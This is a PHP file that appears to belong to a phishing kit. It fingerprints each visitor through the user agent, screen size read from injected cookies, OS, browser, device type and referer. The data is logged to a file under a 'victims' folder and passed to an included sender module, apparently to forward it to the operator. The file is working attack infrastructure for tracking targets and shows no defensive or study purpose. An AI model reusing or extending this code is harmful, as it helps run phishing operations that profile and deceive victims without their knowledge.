<?php
include(".././sender/sender.php");

echo "<script>
document.cookie = 'Width=' + window.screen.availWidth + ';'
document.cookie = 'Height=' + window.screen.availHeight + ';'
</script>";
//Mozilla/5.0 (Windows NT 10.0; rv:79.0) Gecko/20100101 Firefox/79.0


function LogData($IsBot,$Referer,$Page)
{ 
    $user_agent = $_SERVER['HTTP_USER_AGENT'];                                                                //Get User agent

    //$data = file_get_contents("http://ip-api.com/json");                                                      //Get data
    //$data = str_replace(',',"\n",$data);                                                                      //Replace , with newline
    //$data = str_replace('"','',$data);                                                                        //Remove "
    //$data = str_replace('{','',$data);                                                                        //Remove {
    //$data = str_replace('}','',$data);                                                                        //Remove }
    $data = "\nScreen:".$_COOKIE['Width']."x".$_COOKIE['Height'];                                        //Append Screen Size
    $data .= "\nUser Agent:".$user_agent;                                                                //Append User agent
    $data .= "\nOS:".Operating_System($user_agent);                                                      //Append Operating System
    $data .= "\nBrowser:".Browser($user_agent);                                                          //Append Browser
    $data .= "\nDevice:".Device($user_agent);                                                            //Append Device
    $data .= ($Referer == null ? "" : "\nReferer:".$Referer);                                            //Append Http Referer
    $data .= "\nPage:".$Page;                                                                            //Append Page Name
    $data .= "\nBot:".($IsBot ? "Yes" : "No");                                                           //Append Bot
    $data .= "\n\n";                                                                                     //Append dashes
    
    File_Put_Contents(".././victims/logs.txt", $data, FILE_APPEND);                                           //Append data to file
    send($data);
}


function Operating_System($user_agent) 
{
    $Operating_Systems = array(
    	'/windows nt 10/i'     	=>  'Windows 10',
    	'/windows nt 6.3/i'     =>  'Windows 8.1',
    	'/windows nt 6.2/i'     =>  'Windows 8',
    	'/windows nt 6.1/i'     =>  'Windows 7',
    	'/windows nt 6.0/i'     =>  'Windows Vista',
    	'/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
    	'/windows nt 5.1/i'     =>  'Windows XP',
    	'/windows xp/i'         =>  'Windows XP',
    	'/windows nt 5.0/i'     =>  'Windows 2000',
    	'/windows me/i'         =>  'Windows ME',
    	'/win98/i'              =>  'Windows 98',
    	'/win95/i'              =>  'Windows 95',
    	'/win16/i'              =>  'Windows 3.11',
    	'/macintosh|mac os x/i' =>  'Mac OS X',
    	'/mac_powerpc/i'        =>  'Mac OS 9',
    	'/linux/i'              =>  'Linux',
    	'/ubuntu/i'             =>  'Ubuntu',
    	'/iphone/i'             =>  'iPhone',
    	'/ipod/i'               =>  'iPod',
    	'/ipad/i'               =>  'iPad',
    	'/android/i'            =>  'Android',
    	'/blackberry/i'         =>  'BlackBerry',
    	'/webos/i'              =>  'Mobile'
    );
    foreach ($Operating_Systems as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            return $value;
        }
    }
    return "Unknown OS";
}


function Browser($user_agent) 
{
	$browsers = array(
		'/msie/i'       =>  'Internet Explorer',
		'/Trident/i'    =>  'Internet Explorer',
		'/firefox/i'    =>  'Firefox',
		'/safari/i'     =>  'Safari',
		'/chrome/i'     =>  'Chrome',
		'/edge/i'       =>  'Edge',
		'/opera/i'      =>  'Opera',
		'/netscape/i'   =>  'Netscape',
		'/maxthon/i'    =>  'Maxthon',
		'/konqueror/i'  =>  'Konqueror',
		'/ubrowser/i'   =>  'UC Browser',
		'/mobile/i'     =>  'Handheld Browser'
	);
	foreach ($browsers as $regex => $value) 
	{
		if (preg_match($regex, $user_agent))
		{ 
	        return $value;
		}
	}
	return "Unknown Browser";
}

function Device($user_agent)
{
	$tablet_browser = 0;
	$mobile_browser = 0;

	if (preg_match('/(tablet|ipad|playbook)|(android(?!.*(mobi|opera mini)))/i', strtolower($_SERVER['HTTP_USER_AGENT']))) $tablet_browser++;
	if (preg_match('/(up.browser|up.link|mmp|symbian|smartphone|midp|wap|phone|android|iemobile)/i', strtolower($_SERVER['HTTP_USER_AGENT']))) $mobile_browser++;
	if ((strpos(strtolower($_SERVER['HTTP_ACCEPT']),'application/vnd.wap.xhtml+xml') > 0) or ((isset($_SERVER['HTTP_X_WAP_PROFILE']) or isset($_SERVER['HTTP_PROFILE'])))) $mobile_browser++;
	$mobile_ua = strtolower(substr($user_agent, 0, 4));
	$mobile_agents = array(
		'w3c ','acs-','alav','alca','amoi','audi','avan','benq','bird','blac',
		'blaz','brew','cell','cldc','cmd-','dang','doco','eric','hipt','inno',
		'ipaq','java','jigs','kddi','keji','leno','lg-c','lg-d','lg-g','lge-',
		'maui','maxo','midp','mits','mmef','mobi','mot-','moto','mwbp','nec-',
		'newt','noki','palm','pana','pant','phil','play','port','prox','shar',
		'qwap','sage','sams','sany','sch-','sec-','send','seri','sgh-','tim-',
		'sie-','siem','smal','smar','sony','sph-','symb','t-mo','teli','wapp',
		'tosh','tsm-','upg1','upsi','vk-v','voda','wap-','wapa','wapi','xda-',
		'wapr','webc','winw','winw','xda');

	if (in_array($mobile_ua,$mobile_agents)) $mobile_browser++;
	if (strpos(strtolower($user_agent),'opera mini') > 0) 
	{
		$mobile_browser++;
		$stock_ua = strtolower(isset($_SERVER['HTTP_X_OPERAMINI_PHONE_UA'])?$_SERVER['HTTP_X_OPERAMINI_PHONE_UA']:(isset($_SERVER['HTTP_DEVICE_STOCK_UA'])?$_SERVER['HTTP_DEVICE_STOCK_UA']:''));
		if (preg_match('/(tablet|ipad|playbook)|(android(?!.*mobile))/i', $stock_ua)) $tablet_browser++;
	}
	if ($tablet_browser > 0) return 'Tablet';
	else if ($mobile_browser > 0) return 'Mobile';
	else return 'Computer';
}

?>

